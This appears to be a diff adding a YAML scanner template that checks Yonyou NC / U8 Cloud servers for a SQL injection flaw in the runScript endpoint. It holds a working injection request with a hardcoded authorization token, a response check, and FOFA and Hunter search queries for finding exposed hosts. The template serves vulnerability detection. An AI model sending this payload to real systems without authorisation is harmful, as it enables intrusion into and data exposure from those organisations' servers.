@@ -1,0 +1,17 @@
+name: yonyouNC-U8C-sqli2      
+rules: 
+  - method: POST  
+    path: /ncchr/attendScript/internal/runScript
+    headers: 
+      Content-Type: application/x-www-form-urlencoded
+      Authorization: 58e00466213416018d01d15de83b0198
+    body: key=1&script=select 1,111*111,user,4,5,6,7,8,9,10 from dual       
+    expression:                        
+      status_code: 200          
+      response_header:              
+      response_body: 12321
+detail:                          
+  description: "用友NC Cloud，大型企业数字化平台，聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现人、财、物、客的全面数字化。用友NC runScript接口存在SQL注入漏洞,截止到2024.4.27仍存在很多该漏洞网站。截至到2024.6.5部分网站存在该漏洞"
+  search:             
+    fofa: body="UClient.dmg"||app="用友-U8-Cloud"
+    鹰图: web.body="UClient.dmg"
